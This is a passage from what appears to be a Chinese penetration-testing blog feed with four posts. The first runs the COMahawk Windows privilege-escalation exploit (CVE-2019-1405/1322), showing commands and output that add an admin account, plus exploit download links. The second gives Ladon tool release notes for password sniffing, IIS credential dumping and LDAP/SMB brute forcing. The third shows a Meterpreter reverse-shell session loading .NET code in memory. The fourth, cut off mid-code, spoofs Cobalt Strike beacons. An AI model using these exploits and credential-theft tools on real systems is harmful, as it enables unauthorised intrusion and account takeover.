    <content type="html"><![CDATA[<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>由NCC Group研究人员所发现的两个通过COM本地服务进行非法提权的漏洞。第一个漏洞CVE-2019-1405是COM服务中的一个逻辑错误，可让本地普通用户以LOCAL SERVICE身份执行任意命令。第二个漏洞CVE-2019-1322是一个简单的服务配置错误，可让本地SERVICE组中的任何用户重新配置以SYSTEM权限运行的服务（此漏洞也被其他研究人员发现）。当以上两个漏洞结合在一起时，就允许本地普通用户以SYSTEM权限执行任意命令。</p><p>全面检查了一些Windows服务,发现以LOCAL SERVICE或NETWORK SERVICE运行的所有用户都可以执行这种攻击。其中就包括前面我们提到的UPnP Device Host服务,这样我们就能以本地任意用户身份,结合使用CVE-2019-1405及CVE-2019-1322这两个漏洞,成功在Windows 10(1803到1903)系统上将权限提升至SYSTEM用户。</p><h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>Vendor     Product     Versions<br>Microsoft    Windows 10    -, 1607, 1709, 1803, 1809, 1903<br>Microsoft    Windows 7    -<br>Microsoft    Windows 8.1    -<br>Microsoft    Windows Rt 8.1    -<br>Microsoft    Windows Server 2008    -, R2<br>Microsoft    Windows Server 2012    -, R2<br>Microsoft    Windows Server 2016    -, 1803, 1903<br>Microsoft    Windows Server 2019    -</p><h3 id="默认提权"><a href="#默认提权" class="headerlink" title="默认提权"></a>默认提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\null\Desktop&gt;COMahawk64.exe</span><br><span class="line">[\] Progress:  1/9 2/9 3/9 4/9 5/9 6/9 7/9 8/9 9/9</span><br><span class="line">[+] Hopefully k8gege:K8gege520 is added as an admin.</span><br><span class="line"></span><br><span class="line">C:\Users\null\Desktop&gt;net user</span><br><span class="line"></span><br><span class="line">\\DESKTOP-3F42O5D 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line">k8gege                   null                     WDAGUtilityAccount</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><h3 id="指定命令"><a href="#指定命令" class="headerlink" title="指定命令"></a>指定命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\null\Desktop&gt;COMahawk64.exe <span class="string">"net user k8gege K8gege123? /add"</span></span><br><span class="line">[+] Executing <span class="built_in">command</span> [ sc config UsoSvc binpath= <span class="string">"cmd.exe /c net user k8gege K8gege123? /add"</span> ]</span><br><span class="line">[\] Progress:  1/6 2/6 3/6 4/6 5/6 6/6</span><br><span class="line">[+] Command executed.</span><br><span class="line">C:\Users\null\Desktop&gt;net user</span><br><span class="line"></span><br><span class="line">\\DESKTOP-3F42O5D 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line">k8gege                   null                     WDAGUtilityAccount</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><h3 id="Win10提权"><a href="#Win10提权" class="headerlink" title="Win10提权"></a>Win10提权</h3><p>Teston Win10 X64 1803<br><img data-original="http://k8gege.org/k8img/LPE/COMahawk.PNG"></p><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p><a href="https://github.com/apt69/COMahawk" target="_blank" rel="noopener">https://github.com/apt69/COMahawk</a></p><p><a href="https://github.com/k8gege/K8tools/raw/master/Comahawk.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/Comahawk.rar</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h3&gt;&lt;p&gt;由NCC Group研究人员所发现的两个通过COM本地服务进行非法提权的漏洞。第一个漏洞CVE-2019-1405是COM服
      
    
    </summary>
    
    
      <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
    
      <category term="提权" scheme="http://k8gege.org/categories/%E6%8F%90%E6%9D%83/"/>
    
    
      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
      <category term="LPE" scheme="http://k8gege.org/tags/LPE/"/>
    
  </entry>
  
  <entry>
    <title>Ladon6.0新增密码嗅探、IIS密码读取、LDAP域密码爆破</title>
    <link href="http://k8gege.org/p/56393.html"/>
    <id>http://k8gege.org/p/56393.html</id>
    <published>2020-03-28T03:39:45.679Z</published>
    <updated>2020-01-11T07:35:53.056Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/k8gege" target="_blank" rel="noopener"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Ladon" data-original="https://img.shields.io/badge/Ladon-6.0-yellowgreen"></a> <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener"><img alt="Bin" data-original="https://img.shields.io/badge/Ladon-Bin-ff69b4"></a> <a href="https://github.com/k8gege/Ladon/issues" target="_blank" rel="noopener"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/Ladon"></a><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/Ladon"></a></p><h3 id="Ladon6-0"><a href="#Ladon6-0" class="headerlink" title="Ladon6.0"></a>Ladon6.0</h3><p>新增FTP/HTTP密码嗅探、IIS密码读取、LDAP域密码爆破、<br>进程详细信息获取、渗透相关信息获取、命令行参数信息<br>操作系统识别、Wmi密码爆破、Smb密码爆破等功能优化</p><h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><table><thead><tr><th>动作</th><th>模块</th><th>说明</th></tr></thead><tbody><tr><td>新增</td><td>LdapScan</td><td>AD域密码爆破:基于Ldap协议爆破Windows密码</td></tr><tr><td>新增</td><td>FtpSniffer/SnifferFtp</td><td>Ftp密码嗅探(无需WinPcap)</td></tr><tr><td>新增</td><td>HttpSniffer/SnifferHTTP</td><td>HTTP密码嗅探(无需WinPcap)</td></tr><tr><td>新增</td><td>GetCmdLine/CmdLine</td><td>获取进程命令行参数/可指定进程</td></tr><tr><td>新增</td><td>GetInfo</td><td>获取渗透基础信息（IP、域信息、系统信息、软件信息、网络连接、补丁信息、用户等）</td></tr><tr><td>新增</td><td>GetInfo2</td><td>包含GetInfo &amp; Wmi获取信息</td></tr><tr><td>新增</td><td>Sniffer</td><td>网络嗅探(源地址、目标地址)，可用于发现内网存活主机、恶意木马上线地址</td></tr><tr><td>新增</td><td>EnumIIS/IisWeb</td><td>获取IIS站点、路径、帐号、密码</td></tr><tr><td>新增</td><td>EnumProcess/ProcessList/tasklist</td><td>枚举进程 结果(PID、Session、位数、进程名、用户名、路径、标题)</td></tr><tr><td>更新</td><td>HttpDownload/wget</td><td>HTTP下载命令简化也可使用wget</td></tr><tr><td>更新</td><td>OsScan</td><td>扫描速度优化(某项目批量C段不再卡死)</td></tr><tr><td>更新</td><td>WmiScan</td><td>135端口关闭或RPC不可用停止爆破</td></tr><tr><td>更新</td><td>SmbScan</td><td>445端口关闭停止爆破(功能完美代替IpcScan，只是需使用DLL)</td></tr><tr><td>移除</td><td>IPCScan</td><td>速度慢以及批量可能存在误报将其移除，反正SmbScan完全替代</td></tr><tr><td>更新</td><td>所有模块</td><td>所有功能模块参数忽略大小写</td></tr></tbody></table><h3 id="LdapScan-AD域服务器密码爆破"><a href="#LdapScan-AD域服务器密码爆破" class="headerlink" title="LdapScan AD域服务器密码爆破"></a>LdapScan AD域服务器密码爆破</h3><p>非域内机器也可破解跨网段AD域服务器，LDAP端口为389<br>注意非3389，即便跑出来的密码能登远程桌面也没半毛钱关系<br>还有WMI、SMB(IPC)跑出来的密码也一样，3389是RDP协议<br>WMI端口135，SMB端口445，不要以为能登3389一定能IPC连接<br>有时一个帐密各种协议方法都能连到远程机器只能说运气好<br>不要说这个密码3389可以登，但是WMI或SMB跑不出来，瞎搞<br>默认条件下都不能保证100%，更何况经过配置或出问题的系统<br><img alt="LdapScan" data-original="http://k8gege.org/k8img/Ladon/exe/LdapScan_6.0.gif"></p><h3 id="FtpSniffer-FTP密码嗅探"><a href="#FtpSniffer-FTP密码嗅探" class="headerlink" title="FtpSniffer FTP密码嗅探"></a>FtpSniffer FTP密码嗅探</h3><p>支持两种写法: FtpSniffer/SnifferFtp<br>Example: Ladon FtpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="FtpSniffer" data-original="http://k8gege.org/k8img/Ladon/exe/FtpSniffer.PNG"></p><h3 id="HttpSniffer-HTTP密码嗅探"><a href="#HttpSniffer-HTTP密码嗅探" class="headerlink" title="HttpSniffer HTTP密码嗅探"></a>HttpSniffer HTTP密码嗅探</h3><p>支持两种写法: HttpSniffer/SnifferHTTP<br>Example: Ladon HttpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="HttpSniffer" data-original="http://k8gege.org/k8img/Ladon/exe/HttpSniffer.PNG"></p><h3 id="Sniffer-网络嗅探"><a href="#Sniffer-网络嗅探" class="headerlink" title="Sniffer 网络嗅探"></a>Sniffer 网络嗅探</h3><p>基于Socket RAW嗅探，无需安装Winpcap，但需管理员权限<br>主要用于发现内网存活机器或嗅探管理员登陆FTP或WEB站点密码<br>后续可能会添加其它功能可能另外写个专门用于嗅探的工具</p><p>PS: 目前网上大部嗅探工具都是基于Winpcap抓包，某些机器针对其做限制，会提示找不到网卡无法嗅探。<br>重点是不少程序不是GUI就是只能在Linux下用，如果你用py的SCAPY(需winpcap)来实现发现程序高达48M<br>当然也可用于发现恶意木马上线地址(如Cobal strike默认一分钟才发包的netstat不一定看得到)</p><p>Example: Ladon HttpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="Sniffer" data-original="http://k8gege.org/k8img/Ladon/exe/Sniffer.PNG"></p><h3 id="EnumIIS-IIS站点密码读取"><a href="#EnumIIS-IIS站点密码读取" class="headerlink" title="EnumIIS IIS站点密码读取"></a>EnumIIS IIS站点密码读取</h3><p>获取IIS站点、路径、帐号、密码<br><img alt="EnumIIS" data-original="http://k8gege.org/k8img/Ladon/exe/EnumIIS.PNG"></p><h3 id="EnumProcess-进程详细信息获取"><a href="#EnumProcess-进程详细信息获取" class="headerlink" title="EnumProcess 进程详细信息获取"></a>EnumProcess 进程详细信息获取</h3><p>支持三种写法: EnumProcess/ProcessList/tasklist<br>结果(PID、Session、位数、进程名、用户名、路径、标题)<br><img alt="EnumProcess" data-original="http://k8gege.org/k8img/Ladon/exe/EnumProcess.PNG"></p><h3 id="GetCmdLine-进程启动参数"><a href="#GetCmdLine-进程启动参数" class="headerlink" title="GetCmdLine 进程启动参数"></a>GetCmdLine 进程启动参数</h3><p>进程启动参数/可指定进程<br>支持2种写法: GetCmdLine/CmdLine<br><img alt="getcmdline" data-original="http://k8gege.org/k8img/Ladon/exe/getcmdline.PNG"></p><h3 id="GetInfo-获取渗透基础信息"><a href="#GetInfo-获取渗透基础信息" class="headerlink" title="GetInfo 获取渗透基础信息"></a>GetInfo 获取渗透基础信息</h3><p>获取渗透基础信息（IP、域信息、系统信息、软件信息、网络连接、补丁信息、用户等）<br>GetInfo2 包含GetInfo &amp; Wmi获取的相关信息</p><h3 id="全部功能"><a href="#全部功能" class="headerlink" title="全部功能"></a>全部功能</h3><p><a href="http://k8gege.org/p/648af4b3.html">http://k8gege.org/p/648af4b3.html</a></p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://github.com/k8gege&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;img alt=&quot;Author&quot; data-original=&quot;https://img.shields.io/badge/Author-k
      
    
    </summary>
    
    
      <category term="工具" scheme="http://k8gege.org/categories/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="内网" scheme="http://k8gege.org/categories/%E5%86%85%E7%BD%91/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term="密码" scheme="http://k8gege.org/categories/%E5%AF%86%E7%A0%81/"/>
    
      <category term="嗅探" scheme="http://k8gege.org/categories/%E5%97%85%E6%8E%A2/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
      <category term="Sniffer" scheme="http://k8gege.org/tags/Sniffer/"/>
    
      <category term="FtpSniffer" scheme="http://k8gege.org/tags/FtpSniffer/"/>
    
      <category term="HttpSniffer" scheme="http://k8gege.org/tags/HttpSniffer/"/>
    
      <category term="IIS" scheme="http://k8gege.org/tags/IIS/"/>
    
      <category term="LDAP" scheme="http://k8gege.org/tags/LDAP/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit/PowerShell内存加载执行.NET</title>
    <link href="http://k8gege.org/p/57438.html"/>
    <id>http://k8gege.org/p/57438.html</id>
    <published>2020-03-28T03:39:45.679Z</published>
    <updated>2020-01-10T15:32:19.936Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>随着XP和2003退出Windows系统，.NET与PowerShell在渗透中将会更吃香，<br>虽然.NET和PowerShell可以相互调用但PowerShell的兼容性远不如.NET，<br>且想要执行PowerShell，前提也需要.net环境，效率方面也是程序比脚本强<br>同样都可内存加载，为何非要鼓吹PowerShell呢，很多PowerShell框架或模块，<br>兼容性和稳定性并不好都没人说，好了不扯太远，下面我们来看一下如何使用<br>MSF中Meterpreter的powershell模块在内存中执行.NET程序集。</p><h3 id="0x001-C-DLL"><a href="#0x001-C-DLL" class="headerlink" title="0x001 C# DLL"></a>0x001 C# DLL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">namespace msftest</span><br><span class="line">&#123;</span><br><span class="line">    public class msf</span><br><span class="line">    &#123;</span><br><span class="line">        public static string run()</span><br><span class="line">        &#123;</span><br><span class="line">            return &quot;msftest by k8gege&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x002-PowerShell"><a href="#0x002-PowerShell" class="headerlink" title="0x002 PowerShell"></a>0x002 PowerShell</h3><p>首先我们先通过系统自带PowerShell执行DLL，看DLL功能是否正常。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">Reflection.Assembly</span>]::LoadFile(<span class="string">"C:\Users\k8gege\msftest.dll"</span>)</span><br><span class="line"></span><br><span class="line">GAC    Version        Location</span><br><span class="line">---    -------        --------</span><br><span class="line">False  v2.<span class="number">0.50727</span>     C:\Users\k8gege\\msftest.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">msftest.msf</span>]::run()</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure><h3 id="0x003-MSF加载-NET"><a href="#0x003-MSF加载-NET" class="headerlink" title="0x003 MSF加载.NET"></a>0x003 MSF加载.NET</h3><p>将DLL复制至MSF服务器,使用Meterpreter的powershell模块在内存中执行DLL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:443 </span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.61:443 -&gt; 192.168.1.5:54647) at 2019-12-19 20:36:14 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; load powershell</span><br><span class="line">Loading extension powershell...Success.</span><br><span class="line">meterpreter &gt; powershell_import msftest.dll</span><br><span class="line">[+] File successfully imported. No result was returned.</span><br><span class="line">meterpreter &gt; powershell_execute <span class="string">"[msftest.msf]::run()"</span></span><br><span class="line">[+] Command execution completed:</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure><h3 id="0x004-关于兼容性"><a href="#0x004-关于兼容性" class="headerlink" title="0x004 关于兼容性"></a>0x004 关于兼容性</h3><p>1.MSF中的powershell模块稳定性和兼容性并不好，K8在两台WIN7中测试<br>有一台刚加载powershell模块，MET就崩溃导致权限丢失（而且还弹框）<br>再者某些程序集和PowerShell脚本也不能正常加载，有些功能也会失效。<br>这一点Cobalt Strike做得比较好，对.net和PowerShell兼容性80%吧，<br>.NET加载功能好比虚拟机加载操作系统，CS无法执行部分.NET函数很正常<br>正如Ladon在CS下执行，部分功能直接不可用，部分功能执行还有问题。<br>有些人可能说是Ladon的问题，当然说得也没错，但没想过CS的问题吗<br>它提供.NET程序执行的功能,只是使用了几个微软API接口，并不完全<br>试想一下被微软收购做了10几年.NET跨平台的MONO也不能保证100%兼容<br>CS确实是非常强大我承认(不然不使用)，但强大并不等于它就没有问题<br>它的缺点和优点一样，非常多，你用久了懂在理懂的功能多了就会发现<br>MONO那么大都不能保证完全兼容.NET，CS区区几行代码能完全兼容吗?</p><p>我上面说的Ladon在CS下有问题，说Ladon也有问题没错，是因为我认为<br>写一个好的渗透工具，应尽量兼容各种环境。不过CS也只是使用的工具，<br>还不是目标环境，要是连工具自身有BUG的模块都能完全兼容，就是完美。</p><p>目前Ladon有几个模块不兼容CS，在CNA脚本里有注明，用前必看。其它模块<br>可能在CS下使用远不如EXE好用，特别是那些没把时间改成3秒内的，默认60秒<br>才有回显，说成是Ladon扫描慢(即便改成0秒也慢)，因为CS无法完美快速回显。<br>看看CS自带的简单端口扫描或其它扫描，光扫几台机器，CS的回显就很慢吧。<br>何况Ladon还是外置插件，如Ladon扫描百度子域名很快，但在CS下回显很慢，<br>并不是Ladon扫得慢，好比把水管前面接一根吸管，要装满一桶水，能快吗。<br>Ladon扫描很快如同水管，但CS回显如同吸管，水管里的水再快也会因吸管变慢。</p><p>2.powershell模块也支持EXE程序，但需要把.exe改成.dll后缀才能加载。<br>因为通过powershell加载，如果通过系统本身的PowerShell加载都不正常，<br>MSF加载也会失败，因为MSF并不是虚拟一个.NET加载功能。</p><p>如下所示，有时通过系统PowerShell加载ex一样报错<br>PS C:\Users\k8gege&gt; [Reflection.Assembly]::LoadFile(“C:\Users\k8gege\test.exe”)<br>使用“1”个参数调用“LoadFile”时发生异常:“生成此程序集的运行时比当前加载的运<br>行时新,无法加载此程序集。 (异常来自 HRESULT:0x8013101B)”<br>所在位置 行:1 字符: 32</p><ul><li>[Reflection.Assembly]::LoadFile &lt;&lt;&lt;&lt; (“C:\Users\k8gege\test.exe”)<ul><li>CategoryInfo          : NotSpecified: (:) [], MethodInvocationException</li><li>FullyQualifiedErrorId : DotNetMethodException</li></ul></li></ul><h3 id="0x005-结论"><a href="#0x005-结论" class="headerlink" title="0x005 结论"></a>0x005 结论</h3><p>虽然本文介绍了通过MSF加载执行.NET程序的方法，但是从兼容性以及稳定性来看<br>目前在实战中还是慎用为好，以免因为弹框或崩溃导致权限丢失。不能因为MSF强大<br>而无脑使用它的所有功能，程序强大并不代表所有功能模块都稳定好用。只需要使用<br>稳定好用的模块功能即可，其它模块可以等作者更新稳定后再使用。</p><p>注意：我这里说的是不推荐用MSF中的PowerShell加载模块，并不是说MSF。<br>如同说霍金身体残废，但却没有说他是废人哦，何况只是说他一只手受伤。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;随着XP和2003退出Windows系统，.NET与PowerShell在渗透中将会更吃香，&lt;br&gt;虽然.NET和PowerShell可以相
      
    
    </summary>
    
    
      <category term="Metasploit" scheme="http://k8gege.org/categories/Metasploit/"/>
    
      <category term=".NET" scheme="http://k8gege.org/categories/NET/"/>
    
      <category term="PowerShell" scheme="http://k8gege.org/categories/PowerShell/"/>
    
    
      <category term="Metasploit" scheme="http://k8gege.org/tags/Metasploit/"/>
    
      <category term="PowerShell" scheme="http://k8gege.org/tags/PowerShell/"/>
    
      <category term=".NET" scheme="http://k8gege.org/tags/NET/"/>
    
      <category term="C#" scheme="http://k8gege.org/tags/C/"/>
    
      <category term="MSF" scheme="http://k8gege.org/tags/MSF/"/>
    
      <category term="meterpreter" scheme="http://k8gege.org/tags/meterpreter/"/>
    
  </entry>
  
  <entry>
    <title>看我如何模拟Cobalt Strike上线欺骗入侵者</title>
    <link href="http://k8gege.org/p/40523.html"/>
    <id>http://k8gege.org/p/40523.html</id>
    <published>2020-03-28T03:39:45.663Z</published>
    <updated>2020-03-01T05:53:26.034Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>不知道你有没有遇到过马上线却不能操作的情况，我猜当你网络卡或马写得不好时会出现这个问题<br>但是人为的你可能没遇到过，首先要欺骗你的远控，得分析你的协议，如果你的马根本不是公开的<br>网络又是好的，你刚往人家机器里种马，发现马只能上线不能操作，绝对是马有问题，不能甩锅我<br>人家都不知道你的马的通信原理，流量特征，不可能事先准备好一个程序，让你一发就欺骗你的马<br>本文主要研究CS这个APT很喜欢用的马，当然TCP的也一样原理，只要构造对应的数据包就可欺骗</p><h3 id="远控术语"><a href="#远控术语" class="headerlink" title="远控术语"></a>远控术语</h3><p>Cobalt Strike采用的是B/S架构，也就是常说的HTTP协议（HTTPS加密的http，记住都是WEB就不会错了）<br>Client：客户是上帝，我们想买什么告诉服务员。就是控制端，即通过它来控制对方电脑。不叫服务端哦<br>Server：服务员，即服务端。以前常说的肉鸡，这个叫被控端不是控制端，叫做什么就做什么不就是服务？<br>中转：放在VPS，好比现在的快递，可有可无，买家直接见卖家就不需要。CS中转Teamserve就是一个WEB</p><p>就是说如果你用IIS或Tomcat搭建的ASP、JSP、PHP、.NET等网站也可以做为中转，即可实现HTTP远控<br>如果CS不搞客户端，我们便可直接在浏览器上操作和控制目标机器，这就是08年这类码称为B/S架构的原因<br>CS的客户端就像我们用PY或其它语言实现模拟WEB登陆网站来操作一样，中转是WEB，那么肉鸡上线，它也<br>一样是HTTP请求来实现，WEB发包、POST提交不管怎么表达都可以，这是渗透基础，即是CS通信采用HTTP</p><p>C/S架构：Clinet/Server,主要指的是TCP，客户端和服务端，即便带个中转它也还是叫CS架构<br>B/S架构: Browser/Server,主要是HTTP，无论直接通过浏览器操作，还是像CS加个中转再用客户端访问<br>RAT：Remote Admin Tools，远程管理工具，长期以来国内外通用叫法。<br>C2: 老外的新名词，command&amp;control，从字面上就很好理解命令和控制，不管任何协议马都可这样叫<br>这种叫法对于不够专业的人来说不会错，因为他根本不需要了解远控到底用什么协议实现，反正都叫C2</p><p>当然无论是以前还是现在叫RAT也绝对不会错，叫RAT可能更专业一点，RAT像老戏骨，C2像小鲜肉<br>看看现在好多远控基本都有CMD和文件管理，甚至只是一个SHELL而已了，我猜这就是C2的由来吧<br>以前像这样一般只称为后门，随便找一个远控都有CMD、文件管理、屏幕控制、键盘记录等功能<br>而现在一个CMD和文件管理，在10几年前也很难称为马叫炮灰，现在搞个炮灰一堆BUG还以为很吊<br>以前只能称为后门，连远控都称不上的，现在只实现了一个CMD执行命令，就说成自己写个远控了<br>多台机器管理实现不了先不说，只能一对一，断以后就无法控制，连后门都不合格，还TM说成远控</p><p>PS：之所以写这一段话，主要是发现不少写马的或渗透的，竟然都分不清楚服务端和控制端</p><h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><p>还有我说HTTP协议(含HTTP/S)，还有人说不是HTTP还有HTTPS（首先搞清楚HTTPS是什么，加密的HTTP）<br>比方说你设计一个HTTP经过特定格式加密，单纯HTTP访问得不到真实数据而已，解不了就不属于HTTP了？<br>当有一天大家都觉得这个加密好用或安全，给它起个名叫KTTPS，或许可称为新协议，但本质还是HTTP协议。<br>当然可能有些人要说HTTP也属于TCP，虽说HTTP可通过TCP实现，但是两者有很大区别，通过TCP实现叫伪<br>为什么因为它不是真正的HTTP，目标WAF禁TCP的时候，TCP实现的就出不来，HTTP只要会操作WEB就行<br>HTTP比TCP多了一个，允许通过WEB操作来访问，HTTP虽是特殊的TCP，但已经完全变异成了一个新协议。</p><p>就像猩猩和人，我们几乎不会说人是猩猩，只会说人是猩猩进化而来的，因为变异太多，可以以新物种定义。<br>而HTTPS和HTTP，就像戴不戴口罩，戴个口罩就TM不是人了？除了戴个口罩，你的衣食住行哪一样不是人。<br>你不戴口罩进不了小区，那你就戴口罩就能进去了啊，就像HTTPS(HTTP基础上加SSL协议就可以访问了啊)<br>HTTP不加SSL访问不了HTTPS，你就说HTTPS不属于HTTP，这和不戴口罩不让进小区，就说你不是人一样<br>本质是因为你不是人而不让你进吗？而是你不戴口罩，并不是说你不是人所以不让你出入，概念不一样。<br>所以说我们通常只说TCP协议、HTTP协议(因为已包含HTTPS在内)，至少10几年来很少听到有人说HTTPS马<br>最多只是听说这款http马也支持https，或这个webshell工具支持https站点，这个EXP支持HTTPS站点等</p><h3 id="CS心跳包"><a href="#CS心跳包" class="headerlink" title="CS心跳包"></a>CS心跳包</h3><p>一般在设计远控时，我们都会对机器进行标记，比如上线特征为A<br>A对应信息已保存在本地数据库，因此想要确认机器是否还在控<br>我们只需要发送A标识给客户端，告诉它机器还在控制,即心跳包<br>而没实战过的人是每次都发送目标信息，这样很容易被目标发现</p><p>下面配置好CS让其上线后，我们对服务端进行抓包，其心跳包如下<br>CS也是一样，因为是BS模式HTTP协议，它的心跳特征存在Cookie里<br>非正常cookie写法，一段很长的加密数据，可以止来判断是否中招</p><p><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat1.PNG"></p><h3 id="上线验证"><a href="#上线验证" class="headerlink" title="上线验证"></a>上线验证</h3><p>使用Ladon Exp生成器可以提交WEB数据包，类似Firefox上的HackBar但更高级<br>区别在于可生成Ladon插件或独立EXE，对于不懂编程的人来说也可“编写”EXP<br><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat2.PNG"></p><p>运行LadonPoc.exe发现CS上线，执行一次就上线一次，说明思路没错<br><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat3.gif"></p><h3 id="欺骗入侵者"><a href="#欺骗入侵者" class="headerlink" title="欺骗入侵者"></a>欺骗入侵者</h3><p>假设我们在内网中发现别人的CS流量或者抓到样本，给他模拟上线，让他有得看没得吃<br>他在客户端那边只会看到机器在线，就是死活控不了，然后他就想是不是目标环境奇葩<br>还是说网络太卡或有什么问题,能上线就是不能操作，哈哈，一直在上线却啥事也不能做</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">### Cobalt Strike Cheat by K8gege</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cscheat</span><span class="params">()</span>:</span></span><br><span class="line">opener = urllib2.build_opener()</span><br><span class="line">opener.addheaders.append((<span class="string">'Cookie'</span>, <span 